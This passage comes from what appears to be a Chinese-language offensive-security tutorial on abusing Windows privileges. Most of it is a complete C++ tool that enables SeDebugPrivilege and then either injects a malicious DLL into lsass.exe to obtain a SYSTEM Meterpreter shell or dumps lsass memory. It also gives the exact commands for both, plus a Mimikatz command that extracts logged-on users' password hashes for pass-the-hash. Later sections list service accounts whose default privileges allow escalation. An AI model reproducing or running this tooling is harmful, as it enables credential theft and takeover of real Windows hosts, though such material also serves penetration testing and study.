_NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateThreadEx");
```

此外，除了远程线程注入的方法，我们还可以使用 `MiniDumpWriteDump()` 等类似的 API 转储 lsass.exe 进程的内存，从而获取已登录用户哈希值，如下所示。

```c++
status = MiniDumpWriteDump(hProcess, dwProcessId, dumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
		if (!status)
		{
			wprintf(L"[-] MiniDumpWriteDump Error: [%u].\n", GetLastError());
			return status;
		}
		wprintf(L"[*] Dump the memory of %ws process into %ws.\n", lpProcessName, outputFile);
```

下面给出可供参考的利用代码，首先通过 `AdjustTokenPrivileges()` 函数为当前进程开启 SeDebugPrivilege 特权，然后通过上述两种方法滥用该特权。如果执行时 `-e` 参数为 “Injection”，则执行远程线程注入，获取权限。如果 `-e` 参数为 “Mimidump”，则可以转储指定进程的内存。

- SeDebugPrivilege.cpp

```c++
#include "Native.h"
#include <iostream>
#include <DbgHelp.h>
#include <tlhelp32.h>

#pragma comment(lib, "Dbghelp.lib")

DWORD GetProcessIdByName(LPCWSTR lpProcessName)
{
	// Create toolhelp snapshot.
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process;
	ZeroMemory(&process, sizeof(process));
	process.dwSize = sizeof(process);

	// Walkthrough all processes.
	if (Process32FirstW(hSnapshot, &process))
	{
		do
		{
			// Compare process.szExeFile based on format of name, i.e., trim file path
			// trim .exe if necessary, etc.
			if (_wcsicmp(process.szExeFile, lpProcessName) == 0)
			{
				wprintf(L"[*] Got the PID of %ws: %d.\n", lpProcessName, process.th32ProcessID);
				return process.th32ProcessID;
			}
		} while (Process32NextW(hSnapshot, &process));
	}

	CloseHandle(hSnapshot);
	return 0;
}

BOOL ExploitSeDebugPrivilege(LPCWSTR expType, LPCWSTR lpProcessName, LPCWSTR lpDllFileName, LPCWSTR lpOutputFile)
{
	BOOL status = FALSE;
	DWORD dwProcessId;
	CLIENT_ID clientId = { 0 };
	OBJECT_ATTRIBUTES ObjectAttributes;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	SIZE_T dwSize = 0;
	LPVOID lpDllAddr = NULL;
	FARPROC pLoadLibraryProc = NULL;
	HANDLE dumpFile;

	dwProcessId = GetProcessIdByName(lpProcessName);

	ZeroMemory(&clientId, sizeof(clientId));
	clientId.UniqueProcess = UlongToHandle(dwProcessId);
	clientId.UniqueThread = NULL;

	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
	status = NT_SUCCESS(NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &clientId));
	if (!status)
	{
		printf("[-] NtOpenProcess Error: [%u].\n", GetLastError());
		return status;
	}
	if (!wcscmp(expType, L"Injection"))
	{
		// Allocate virtual memory space in a remote process.
		dwSize = (wcslen(lpDllFileName) + 1) * sizeof(WCHAR);
		status = NT_SUCCESS(NtAllocateVirtualMemory(hProcess, &lpDllAddr, 0, &dwSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE));
		if (!status)
		{
			printf("[-] NtAllocateVirtualMemory Error: [%u].\n", GetLastError());
			return status;
		}
		wprintf(L"[*] Allocate virtual memory space in a %ws process: 0x%016llx\n", lpProcessName, lpDllAddr);

		// Write DLL path data to the allocated memory.
		status = NT_SUCCESS(NtWriteVirtualMemory(hProcess, lpDllAddr, (LPVOID)lpDllFileName, dwSize, NULL));
		if (!status)
		{
			printf("[-] NtWriteVirtualMemory Error: [%u].\n", GetLastError());
			return status;
		}
		wprintf(L"[*] Write DLL path to the allocated memory.\n");

		// Get the LoadLibraryW function address through kernel32.dll.
		pLoadLibraryProc = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
		if (pLoadLibraryProc == NULL)
		{
			printf("[-] GetProcAddress Error: [%u].\n", GetLastError());
			return status;
		}
		wprintf(L"[*] Get address of LoadLibraryW: 0x%016llx.\n", pLoadLibraryProc);

		// Use CreateRemoteThread to create a remote thread for DLL injection.
		//hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryProc, lpDllAddr, 0, NULL);
		status = NT_SUCCESS(NtCreateThreadEx(&hThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)pLoadLibraryProc, lpDllAddr, 0, 0, 0, 0, NULL));
		if (!status)
		{
			wprintf(L"[-] NtCreateThreadEx Error: [%u].\n", GetLastError());
			return status;
		}
		wprintf(L"[*] Create a remote thread for DLL injection.\n");

		WaitForSingleObject(hThread, -1);
		CloseHandle(hProcess);
	}
	else if (!wcscmp(expType, L"Minidump"))
	{
		dumpFile = CreateFileW(lpOutputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (dumpFile == INVALID_HANDLE_VALUE)
		{
			wprintf(L"[-] CreateFileW Error: [%u].\n", GetLastError());
			return status;
		}
		status = MiniDumpWriteDump(hProcess, dwProcessId, dumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
		if (!status)
		{
			wprintf(L"[-] MiniDumpWriteDump Error: [%u].\n", GetLastError());
			return status;
		}
		wprintf(L"[*] Dump the memory of %ws process into %ws.\n", lpProcessName, lpOutputFile);
	}

	return status;
}

BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
{
	BOOL status = FALSE;
	LUID luidValue = { 0 };
	TOKEN_PRIVILEGES tokenPrivileges;

	// Get the LUID value of the privilege for the local system
	if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
	{
		wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
		return status;
	}

	// Set escalation information
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luidValue;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Elevate Process Token Access
	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
	{
		wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
		return status;
	}
	else
	{
		status = TRUE;
	}
	return status;
}

void PrintUsage()
{
	wprintf(
		L"Abuse of SeDebugPrivilege by @WHOAMI (whoamianony.top)\n\n"
		L"Arguments:\n"
		L"  -h                          Show this help message and exit.\n"
		L"  -e <Injection, Minidump>    Choose the type of exploit.\n"
		L"  -p <ProcessName>            Specifies the system process name.\n"
		L"  -m <DLL>                    Specifies the malicious DLL path.\n"
		L"  -o <DLL>                    The file the process memory is dumped to.\n"
	);
}

int wmain(int argc, wchar_t* argv[])
{
	HANDLE hToken = NULL;
	LPCWSTR expType = L"Injection";
	LPCWSTR lpProcessName = L"lsass.exe";
	LPCWSTR lpDllFileName = NULL;
	LPCWSTR lpOutputFile = NULL;

	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
		case 'h':
			PrintUsage();
			return 0;
		case 'e':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				expType = (LPCWSTR)argv[1];
			}
			break;
		case 'p':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				lpProcessName = (LPCWSTR)argv[1];
			}
			break;
		case 'm':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				lpDllFileName = (LPCWSTR)argv[1];
			}
			break;
		case 'o':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				lpOutputFile = (LPCWSTR)argv[1];
			}
			break;
		default:
			wprintf(L"[-] Invalid Argument: %s.\n", argv[1]);
			PrintUsage();
			return 0;
		}

		++argv;
		--argc;
	}

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		wprintf(L"[-] OpenProcessToken Error: [%u].\n", GetLastError());
		return 0;
	}
	// Enable SeDebugPrivilege for the current process token.
	if (EnableTokenPrivilege(hToken, SE_DEBUG_NAME))
	{
		if (ExploitSeDebugPrivilege(expType, lpProcessName, lpDllFileName, lpOutputFile))
		{
			return 1;
		}
	}
}
```

将编译并生成好的 SeBackupPrivilege.exe 上传到目标主机，执行以下命令，将恶意的 DLL 注入到 lsass.exe 进程中，如下图所示，成功获得 SYSTEM 权限的 Meterpreter。

```powershell
SeDebugPrivilege.exe -e "Injection" -p "lsass.exe" -m "C:\Users\Marcus\shell.dll"
```

![image-20230215105701491](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230215105701491.png)

执行以下命令，将 lsass.exe 进程的内存转储到 lsass.dmp 文件中，如下图所示。

```powershell
SeDebugPrivilege.exe -e "Minidump" -p "lsass.exe" -o ".\lsass.dmp"
```

![image-20230215151405876](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230215151405876.png)

将 lsass.dmp 下载到本地，通过 Mimikatz 离线解析并提取出已登陆的用户哈希，如下图所示。

```c++
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
```

![image-20230215150653195](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230215150653195.png)

得到的管理员用户哈希可以用来执行哈希传递，并获取系统管理权限。

## SeTrustedCredmanAccessPrivilege *















## SeEnableDelegationPrivilege *













# # Abusing Existing Service Accounts

攻击者以本地服务帐户访问机器。

在许多常见场景中，攻击者能够在目标计算机上的服务帐户上下文中执行代码，包括：

- 服务本身因某些漏洞而受到损害。典型场景包括允许在运行 IIS 帐户上下文中执行的 Web 应用程序漏洞，以及 xp_cmdshell 可用于在 MSSQL 服务帐户上下文中运行代码的 SQL 注入漏洞。
- 服务帐户凭据以某种方式泄露。
- Kerberoast 类型的攻击。 从域控制器为目标帐户请求 Kerberos 票证。此票证的一部分使用目标帐户的密码哈希进行加密。 这可以有效地离线破解以产生帐户密码。

在任何这些场景中，如果服务帐户恰好具有上一节中概述的特权之一，则可以通过利用该项目中的相应模块来简单地获得本地特权升级。

## MSSQL / IIS

如果我们使用 Sysinternals 的 AccessChk 工具检查分配给 MSSQL 和 IIS 服务帐户的默认权限，我们会发现以下内容：

```cmd
IIS - SeImpersonatePrivilege - BUILTIN\IIS_IUSRS
MSSQL - SeAssignPrimaryTokenPrivilege - 
                            NT SERVICE\SQLAgent$SQLEXPRESS, 
                            NT SERVICE\MSSQLLaunchpad$SQLEXPRESS, 
                            NT SERVICE\MSSQL$SQLEXPRESS
```

通过利用该项目中的模块，这些权限对于本地特权提升来说已经足够了。 这些帐户的失陷是一种非常常见的渗透测试场景。每当 MSSQL 中的 SQL 注入或 IIS 中的 Web 应用程序漏洞被利用来获得命令执行时，攻击者最终都会获得这些特权。

## Backup Products

市场上的每个商业备份产品都将以某种提升的特权运行。在许多情况下，备份服务帐户将以 SYSTEM 权限运行，无需提升特权。然而，在管理员开始变得聪明起来的地方，我们开始看到这些帐户的权限变得更加受限。

以下是 Veritas NetBackup 解决方案所需的最低权限，无耻地从他们的网站 (https://www.veritas.com/support/en_US/article.TECH36718) 借来的：

- *Act as a part of Operating System ( Only for Windows Server 2000 ).
- *Create a token object.
- Log on as a service.
- Logon as a batch job.
- Manage auditing and security log.
- *Backup files and directories.
- *Restore files and directories.

请注意列表中我们用星号 (*) 标记的 4 项。考虑到本项目中描述的技术之一，这些特权中的任何一个都可以单独用于获得本地特权提升。

## Local Service Accounts

每台 Windows 计算机上也有预定义的服务帐户，其中包含可用于本地特权提升的权限。它们是：

- NT AUTHORITY\SERVICE
- NT AUTHORITY\NETWORK SERVICE
- NT AUTHORITY\LOCAL SERVICE

其中每一个都有略微不同的特权，有些包含多个可利用的特权，但它们都包含可利用的 SeImpersonatePrivilege 特权。

如果攻击者能够以某种方式在这些受限本地帐户之一的上下文中获得对系统的访问权限，他们可以使用上述技术将他们的权限提升到 NT AUTHORITY\SYSTEM。





































































## Ending......

参考文献：

> 
